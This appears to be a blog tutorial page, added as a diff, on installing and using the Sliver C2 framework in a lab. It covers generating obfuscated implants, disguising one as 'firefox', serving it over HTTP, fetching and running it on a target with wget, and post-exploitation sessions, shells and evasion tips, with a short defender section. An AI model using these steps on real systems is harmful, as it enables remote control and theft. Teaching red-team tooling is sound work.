@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Getting Started with Sliver C2 | Zerotrace Logs</title>
+  <meta name="description" content="A comprehensive guide to installing, configuring, and using Sliver C2 framework for command and control operations in penetration testing engagements." />
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">×</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector2.html">Machines Walkthroughs</a></li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li><a href="../vector4.html">Projects</a></li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Getting Started with Sliver C2</h2>
+  <p><img src="../assets/Getting-Started-with-Sliver.png" alt="Sliver C2 Framework"></p>
+  <p><em>Published: November 16, 2025</em></p>
+
+  <div class="disclaimer">
+    <strong>⚠️ Legal and Ethical Notice:</strong> Sliver C2 is a powerful command and control framework designed for legitimate penetration testing and red team operations. This tutorial is intended for authorized security professionals only. Unauthorized use of C2 frameworks against systems you do not own or have explicit permission to test is illegal and unethical. Always obtain proper written authorization before conducting any security assessments.
+  </div>
+
+  <h3>Overview</h3>
+  <p>Sliver is a modern, open-source Command and Control (C2) framework developed by BishopFox, designed for penetration testers and red teamers. Unlike traditional C2 frameworks, Sliver offers cross-platform support, multiple communication protocols, and built-in operational security features that make it a powerful tool for adversary simulation and security testing.</p>
+
+  <p><strong>What you'll learn in this guide:</strong></p>
+  <ul>
+    <li>How to install and configure Sliver C2 on Kali Linux</li>
+    <li>Understanding Sliver's core concepts: implants, sessions, and listeners</li>
+    <li>Generating cross-platform implants for Windows and Linux targets</li>
+    <li>Establishing C2 connections using MTLS protocol</li>
+    <li>Basic post-exploitation commands and session management</li>
+    <li>Delivering implants to target systems</li>
+  </ul>
+
+  <h3>Prerequisites</h3>
+  <p>Before starting this tutorial, ensure you have:</p>
+  <ul>
+    <li>Kali Linux (or similar penetration testing distribution)</li>
+    <li>Root or sudo privileges for installation</li>
+    <li>Basic understanding of command and control concepts</li>
+    <li>Network connectivity between your C2 server and target machines</li>
+    <li>Authorized lab environment for testing (never test on unauthorized systems)</li>
+  </ul>
+
+  <h2>Understanding Sliver C2</h2>
+
+  <div class="question">
+    <strong>What Makes Sliver Different?</strong>
+  </div>
+  <div class="answer">
+    Sliver distinguishes itself from other C2 frameworks through several key features:
+    <ul>
+      <li><strong>Cross-platform support:</strong> Generate implants for Windows, Linux, and macOS</li>
+      <li><strong>Multiple C2 protocols:</strong> MTLS, WireGuard, HTTP/S, DNS for flexible communication</li>
+      <li><strong>Dynamic code generation:</strong> Each implant is compiled uniquely to avoid signature detection</li>
+      <li><strong>Modern architecture:</strong> Written in Go for performance and portability</li>
+      <li><strong>Active development:</strong> Maintained by BishopFox with regular updates</li>
+    </ul>
+  </div>
+
+  <div class="question">
+    <strong>Sessions vs Beacons: What's the Difference?</strong>
+  </div>
+  <div class="answer">
+    Sliver supports two types of connections:
+    <ul>
+      <li><strong>Sessions:</strong> Real-time, interactive connections that maintain a persistent TCP connection. Ideal for active exploitation but more detectable.</li>
+      <li><strong>Beacons:</strong> Asynchronous, callback-based connections that check in periodically. Better for operational security as they blend into normal network traffic.</li>
+    </ul>
+    <p>This guide focuses on sessions for simplicity, but beacons are recommended for real-world engagements.</p>
+  </div>
+
+  <h2>Installation and Setup</h2>
+
+  <h3><span class="step">[Step 1]</span> Installing Sliver C2</h3>
+  <p>Sliver provides an automated installation script that handles all dependencies. Run the following command to download and install:</p>
+  <pre><code>curl https://sliver.sh/install | sudo bash</code></pre>
+
+  <p>This script will:</p>
+  <ul>
+    <li>Download the latest Sliver server binary</li>
+    <li>Install it to <code>/usr/local/bin/sliver-server</code></li>
+    <li>Set up systemd service for automatic startup</li>
+    <li>Configure necessary permissions</li>
+  </ul>
+
+  <div class="note">
+    <strong>Installation Note:</strong> The installer requires root privileges because it creates system services and modifies system directories. Always review installation scripts before piping them to bash in production environments.
+  </div>
+
+  <h3><span class="step">[Step 2]</span> Verifying the Installation</h3>
+  <p>After installation completes, verify that the Sliver service is running correctly:</p>
+  <pre><code>sudo systemctl status sliver</code></pre>
+
+  <p>You should see output indicating the service is <code>active (running)</code>. If the service is not running, start it manually:</p>
+  <pre><code>sudo systemctl start sliver</code></pre>
+
+  <div class="note">
+    <strong>Important:</strong> After system reboots, ensure the Sliver service is running before attempting to connect. Enable automatic startup with: <code>sudo systemctl enable sliver</code>
+  </div>
+
+  <h3><span class="step">[Step 3]</span> Installing Mingw-w64 (Windows Cross-Compilation)</h3>
+  <p>To generate Windows implants from your Linux system, you'll need the Mingw-w64 toolchain:</p>
+  <pre><code>sudo apt install mingw-w64</code></pre>
+
+  <p>This package provides the necessary compilers and libraries to build Windows executables and DLLs from Linux. Without it, you'll only be able to generate implants for your host operating system.</p>
+
+  <h2>Navigating the Sliver CLI</h2>
+
+  <h3><span class="step">[Launch]</span> Starting the Sliver Console</h3>
+  <p>Launch the Sliver command-line interface by simply typing:</p>
+  <pre><code>sliver</code></pre>
+
+  <p>You'll be greeted with the Sliver prompt, indicating you're ready to start creating implants and managing sessions.</p>
+
+  <div class="question">
+    <strong>How Do I Learn Sliver Commands?</strong>
+  </div>
+  <div class="answer">
+    The <code>help</code> command is your primary resource for learning Sliver. Here's how to use it:
+    <ul>
+      <li><code>help</code> - Lists all available commands with brief descriptions</li>
+      <li><code>help &lt;command&gt;</code> - Shows detailed usage, flags, and examples for a specific command</li>
+      <li><code>help generate</code> - Learn about implant generation options</li>
+      <li><code>help mtls</code> - Understand MTLS listener configuration</li>
+    </ul>
+    <p>Always consult <code>help</code> when exploring new functionality or troubleshooting issues.</p>
+  </div>
+
+  <h3>Essential Sliver Commands</h3>
+
+  <h4><code>generate</code> - Creating Implants</h4>
+  <p>The <code>generate</code> command creates new implant binaries. You must specify at least one C2 protocol and can customize the target platform:</p>
+  <pre><code>generate --mtls &lt;IP:PORT&gt; --os &lt;windows|linux|macos&gt; --arch &lt;amd64|386&gt; --save &lt;path&gt;</code></pre>
+
+  <h4>Listener Commands: <code>mtls</code>, <code>http</code>, <code>https</code>, <code>dns</code></h4>
+  <p>These commands start listeners for their respective protocols. Listeners wait for incoming connections from deployed implants:</p>
+  <pre><code>mtls --lhost &lt;IP&gt; --lport &lt;PORT&gt;</code></pre>
+
+  <h4><code>sessions</code> - Managing Active Connections</h4>
+  <p>View, interact with, or terminate active sessions:</p>
+  <ul>
+    <li><code>sessions</code> - List all current sessions</li>
+    <li><code>sessions -i &lt;ID&gt;</code> - Interact with a specific session</li>
+    <li><code>sessions -k &lt;ID&gt;</code> - Kill a session</li>
+  </ul>
+
+  <h4><code>use</code> - Switching to a Session</h4>
+  <p>Drop into an interactive session for direct command execution:</p>
+  <pre><code>use &lt;session_id&gt;</code></pre>
+
+  <h4><code>background</code> - Backgrounding Sessions</h4>
+  <p>Return to the main Sliver shell while keeping the session active:</p>
+  <pre><code>background</code></pre>
+
+  <h4><code>jobs</code> - Viewing Active Listeners</h4>
+  <p>Display all running listeners and background tasks:</p>
+  <pre><code>jobs</code></pre>
+
+  <h2>Understanding Implant Types</h2>
+
+  <div class="note">
+    <strong>Platform-Specific Executables:</strong> Each operating system uses different executable formats. Understanding these is crucial for successful implant deployment.
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Operating System</th>
+        <th>File Format</th>
+        <th>Description</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Windows</strong></td>
+        <td><code>.exe</code></td>
+        <td>Portable Executable - Standard Windows application format</td>
+      </tr>
+      <tr>
+        <td><strong>Windows</strong></td>
+        <td><code>.dll</code></td>
+        <td>Dynamic-Link Library - Shared library for sideloading attacks</td>
+      </tr>
+      <tr>
+        <td><strong>Linux</strong></td>
+        <td><code>ELF</code></td>
+        <td>Executable and Linkable Format - Standard Unix/Linux executable</td>
+      </tr>
+      <tr>
+        <td><strong>macOS</strong></td>
+        <td><code>Mach-O</code></td>
+        <td>Mach Object - Native macOS/iOS executable format</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Practical Walkthrough: Windows Target</h2>
+
+  <h3><span class="step">[Example 1]</span> Generating a Windows MTLS Implant</h3>
+  <p>Let's create a Windows implant using the MTLS (Mutual TLS) protocol, which provides encrypted, authenticated communication:</p>
+  <pre><code>sliver &gt; generate --mtls 192.168.140.128:443 --os windows --save /home/kali</code></pre>
+
+  <p><strong>Command breakdown:</strong></p>
+  <ul>
+    <li><code>--mtls 192.168.140.128:443</code> - Specifies the C2 server IP and port the implant will callback to</li>
+    <li><code>--os windows</code> - Target operating system</li>
+    <li><code>--save /home/kali</code> - Directory to save the compiled implant</li>
+  </ul>
+
+  <p>You'll see output similar to:</p>
+  <pre><code>[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 30s
+[*] Implant saved to /home/kali/BIG_FENCING.exe</code></pre>
+
+  <div class="note">
+    <strong>Symbol Obfuscation:</strong> Sliver automatically obfuscates symbols and strings in the compiled binary to evade signature-based detection. Each build is unique, making static analysis more difficult for defenders.
+  </div>
+
+  <h2>Practical Walkthrough: Linux Target</h2>
+
+  <p>This walkthrough demonstrates the complete process of generating, delivering, and catching a Sliver implant on a Linux target system.</p>
+
+  <h3><span class="step">[Step 1]</span> Generate Linux Implant</h3>
+  <p>From the Sliver console, generate an MTLS implant for Linux:</p>
+  <pre><code>sliver &gt; generate --mtls 10.200.0.159:443 --os linux --save /home/kali/</code></pre>
+
+  <p>Replace <code>10.200.0.159</code> with your Kali machine's IP address (use <code>ip a</code> to find it). The implant will be saved with a randomly generated name like <code>above-freezer</code>.</p>
+
+  <h3><span class="step">[Step 2]</span> Prepare for Transfer</h3>
+  <p>Create a directory to organize your implant delivery:</p>
+  <pre><code>mkdir webserver
+mv above-freezer webserver/firefox
+cd webserver</code></pre>
+
+  <p>Renaming the implant to something legitimate-sounding like <code>firefox</code> helps with social engineering and reduces suspicion during manual inspection.</p>
+
+  <h3><span class="step">[Step 3]</span> Start HTTP Server for Delivery</h3>
+  <p>Use Python's built-in HTTP server to host the implant:</p>
+  <pre><code>python3 -m http.server 80</code></pre>
+
+  <p>This creates a simple web server on port 80, serving files from the current directory. Your implant is now accessible at <code>http://&lt;your-IP&gt;/firefox</code>.</p>
+
+  <div class="note">
+    <strong>Alternative Delivery Methods:</strong> In real engagements, you might use USB drops, email attachments, SMB shares, or exploit delivery. The HTTP method is shown here for simplicity in lab environments.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Configure MTLS Listener</h3>
+  <p>Open a new terminal tab, launch Sliver again, and start the MTLS listener:</p>
+  <pre><code>sliver &gt; mtls --lhost 10.200.0.159 --lport 443</code></pre>
+
+  <p><strong>Important:</strong> The IP and port must match exactly what you specified when generating the implant. Mismatched values will prevent callback.</p>
+
+  <p>Verify the listener is active:</p>
+  <pre><code>sliver &gt; jobs
+
+ID   Name   Protocol   Port
+==   ====   ========   ====
+1    mtls   tcp        443</code></pre>
+
+  <h3><span class="step">[Step 5]</span> Execute on Target Machine</h3>
+  <p>On your target Linux system, download and execute the implant:</p>
+  <pre><code># Download the implant
+wget http://10.200.0.159/firefox
+
+# Make it executable
+chmod +x firefox
+
+# Execute the implant
+./firefox</code></pre>
+
+  <p>The implant will execute silently in the foreground. For persistent access, you'd typically background it or establish persistence mechanisms, but that's beyond the scope of this introductory guide.</p>
+
+  <h3><span class="step">[Step 6]</span> Interact with the Session</h3>
+  <p>Back in your Sliver console, you should see a new session notification:</p>
+  <pre><code>[*] Session e8a4bc72 FREEZING_HARBOR - 10.200.0.200:45832 (victim-machine) - linux/amd64 - Sun, 16 Nov 2025 14:23:45 UTC</code></pre>
+
+  <p>List all active sessions:</p>
+  <pre><code>sliver &gt; sessions
+
+ID         Name              Transport   Remote Address         Hostname         Username   Operating System   Last Check-In
+==========  ================  ==========  =====================  ===============  =========  =================  =============
+e8a4bc72   FREEZING_HARBOR   mtls        10.200.0.200:45832     victim-machine   ubuntu     linux/amd64        0s ago</code></pre>
+
+  <p>Interact with your new session:</p>
+  <pre><code>sliver &gt; sessions -i e8a4bc72</code></pre>
+
+  <p>Now you're in an interactive session. Test with basic commands:</p>
+  <pre><code>[victim-machine] sliver &gt; whoami
+ubuntu
+
+[victim-machine] sliver &gt; pwd
+/home/ubuntu</code></pre>
+
+  <h2>Working Within Sessions</h2>
+
+  <p>Once inside a session, you have access to numerous post-exploitation commands. Here are the essentials:</p>
+
+  <h3>Basic Information Gathering</h3>
+  <ul>
+    <li><code>whoami</code> - Display current user and hostname</li>
+    <li><code>getuid</code> - Show user ID and group information</li>
+    <li><code>info</code> - Display detailed session information</li>
+    <li><code>ifconfig</code> - Show network interfaces and IP addresses</li>
+    <li><code>netstat</code> - List active network connections</li>
+  </ul>
+
+  <h3>File System Operations</h3>
+  <ul>
+    <li><code>ls</code> - List directory contents</li>
+    <li><code>cd &lt;path&gt;</code> - Change directory</li>
+    <li><code>pwd</code> - Print working directory</li>
+    <li><code>cat &lt;file&gt;</code> - Display file contents</li>
+    <li><code>download &lt;remote_file&gt; &lt;local_path&gt;</code> - Download files from target</li>
+    <li><code>upload &lt;local_file&gt; &lt;remote_path&gt;</code> - Upload files to target</li>
+  </ul>
+
+  <h3>Interactive Shell Access</h3>
+  <p>For maximum flexibility, drop into a native shell:</p>
+  <pre><code>[victim-machine] sliver &gt; shell</code></pre>
+
+  <p>This spawns an interactive shell (bash on Linux, PowerShell on Windows). You can now run any operating system command as if you were directly logged in.</p>
+
+  <div class="note">
+    <strong>OpSec Warning:</strong> Interactive shells are considered "noisy" from a detection perspective. They spawn visible processes and can trigger alerts in EDR solutions. Use built-in Sliver commands when possible for stealth.
+  </div>
+
+  <p><strong>Exiting the shell:</strong> Type <code>exit</code> and then press <code>CTRL+D</code> to return to the Sliver session.</p>
+
+  <h3>Session Management</h3>
+  <p>To leave a session without terminating it:</p>
+  <pre><code>[victim-machine] sliver &gt; background</code></pre>
+
+  <p>This returns you to the main Sliver prompt while keeping the session active in the background. You can reconnect anytime using <code>sessions -i &lt;ID&gt;</code>.</p>
+
+  <h2>Understanding the Armory</h2>
+
+  <div class="question">
+    <strong>What is the Sliver Armory?</strong>
+  </div>
+  <div class="answer">
+    The Sliver Armory is a repository of community-contributed extensions and third-party tools that integrate with the Sliver framework. Think of it as a package manager for post-exploitation capabilities.
+  </div>
+
+  <h3>Armory Features</h3>
+  <ul>
+    <li><strong>Extensions:</strong> Pre-built modules for common tasks (credential dumping, privilege escalation, lateral movement)</li>
+    <li><strong>Aliases:</strong> Custom commands that extend Sliver's functionality</li>
+    <li><strong>Community tools:</strong> Integration with popular offensive security tools</li>
+  </ul>
+
+  <h3>Using the Armory</h3>
+  <p>Browse available packages:</p>
+  <pre><code>sliver &gt; armory</code></pre>
+
+  <p>Install a specific package:</p>
+  <pre><code>sliver &gt; armory install &lt;package_name&gt;</code></pre>
+
+  <p>Common useful packages include:</p>
+  <ul>
+    <li><code>SharpHound</code> - Active Directory enumeration</li>
+    <li><code>Rubeus</code> - Kerberos abuse toolkit</li>
+    <li><code>Seatbelt</code> - Windows host enumeration</li>
+  </ul>
+
+  <div class="note">
+    <strong>Note:</strong> The Armory is constantly evolving with new contributions. Always review extension source code before use in production engagements.
+  </div>
+
+  <h2>Operational Security Considerations</h2>
+
+  <h3><span class="step">🔒 Best Practices</span></h3>
+  <ul>
+    <li><strong>Use beacons over sessions:</strong> Beacons with jitter reduce network signature visibility</li>
+    <li><strong>Vary C2 protocols:</strong> Don't rely solely on MTLS; rotate between HTTP, DNS, and WireGuard</li>
+    <li><strong>Enable symbol obfuscation:</strong> Sliver does this by default, but verify in production builds</li>
+    <li><strong>Customize implant names:</strong> Use <code>--name</code> flag for better session tracking</li>
+    <li><strong>Clean up artifacts:</strong> Always remove implants and logs after authorized testing</li>
+  </ul>
+
+  <h3><span class="step">🛡️ For Defenders</span></h3>
+  <p>Understanding Sliver helps defenders detect and respond to C2 activity:</p>
+  <ul>
+    <li>Monitor for outbound connections on common C2 ports (443, 80, 53)</li>
+    <li>Analyze TLS certificate anomalies (Sliver uses custom certificates)</li>
+    <li>Look for suspicious process behavior (unusual parent-child relationships)</li>
+    <li>Enable EDR behavioral detection for uncommon network patterns</li>
+    <li>Baseline normal DNS/HTTP traffic to identify C2 beaconing</li>
+  </ul>
+
+  <h2>Troubleshooting Common Issues</h2>
+
+  <div class="question">
+    <strong>Implant Won't Callback</strong>
+  </div>
+  <div class="answer">
+    <strong>Check these common issues:</strong>
+    <ul>
+      <li>Verify the listener is running with <code>jobs</code></li>
+      <li>Ensure IP address matches between implant generation and listener</li>
+      <li>Check firewall rules allow traffic on the specified port</li>
+      <li>Confirm network connectivity between target and C2 server</li>
+      <li>Review listener configuration with <code>help mtls</code></li>
+    </ul>
+  </div>
+
+  <div class="question">
+    <strong>Can't Generate Windows Implants on Linux</strong>
+  </div>
+  <div class="answer">
+    Install the cross-compilation toolchain:
+    <pre><code>sudo apt install mingw-w64</code></pre>
+    Then restart Sliver and try again.
+  </div>
+
+  <div class="question">
+    <strong>Session Dropped Unexpectedly</strong>
+  </div>
+  <div class="answer">
+    Sessions can drop due to:
+    <ul>
+      <li>Network instability or firewall interruption</li>
+      <li>Target system shutdown or reboot</li>
+      <li>EDR detection and process termination</li>
+      <li>Manual termination by user or administrator</li>
+    </ul>
+    Consider using beacons with reconnection logic for more resilient C2.
+  </div>
+
+  <h2>Next Steps and Advanced Topics</h2>
+
+  <p>This guide covered the fundamentals of Sliver C2. To continue your learning:</p>
+
+  <h3>Advanced Sliver Features</h3>
+  <ul>
+    <li><strong>Beacon configuration:</strong> Learn to configure callback intervals, jitter, and sleep times</li>
+    <li><strong>DNS C2:</strong> Implement stealthy DNS-based command and control</li>
+    <li><strong>HTTP/S C2:</strong> Use domain fronting and CDN redirectors</li>
+    <li><strong>Multiplayer mode:</strong> Collaborate with team members in shared operations</li>
+    <li><strong>Pivoting:</strong> Use compromised systems as relay points</li>
+    <li><strong>Privilege escalation:</strong> Leverage built-in exploits and bypasses</li>
+  </ul>
+
+  <h3>Integration with Other Tools</h3>
+  <ul>
+    <li>Combine with Metasploit for exploit delivery</li>
+    <li>Use Covenant or Empire for protocol diversity</li>
+    <li>Integrate with BloodHound for Active Directory mapping</li>
+    <li>Leverage CrackMapExec for lateral movement</li>
+  </ul>
+
+  <h3>Resources for Further Learning</h3>
+  <ul>
+    <li><a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">Official Sliver GitHub Repository</a></li>
+    <li><a href="https://sliver.sh/docs" target="_blank" rel="noopener">Sliver Documentation</a></li>
+    <li><a href="https://github.com/BishopFox/sliver/wiki" target="_blank" rel="noopener">Sliver Wiki</a></li>
+    <li>BishopFox YouTube channel for video tutorials</li>
+  </ul>
+
+  <h2>Key Takeaways</h2>
+  <div class="answer">
+    <p>Sliver C2 is a modern, versatile framework that brings enterprise-grade capabilities to penetration testing engagements. Through this guide, you've learned:</p>
+    <ul>
+      <li>How to install and configure Sliver on Kali Linux</li>
+      <li>The difference between sessions and beacons for operational flexibility</li>
+      <li>Generating cross-platform implants with MTLS communication</li>
+      <li>Delivering and executing implants on Linux and Windows targets</li>
+      <li>Basic session interaction and post-exploitation commands</li>
+      <li>The role of the Armory in extending Sliver's capabilities</li>
+    </ul>
+    <p>Remember that C2 frameworks are powerful tools that require responsibility, authorization, and ethical use. Always operate within the bounds of your engagement scope and applicable laws. The knowledge gained here should be used to strengthen security postures, not compromise them.</p>
+  </div>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
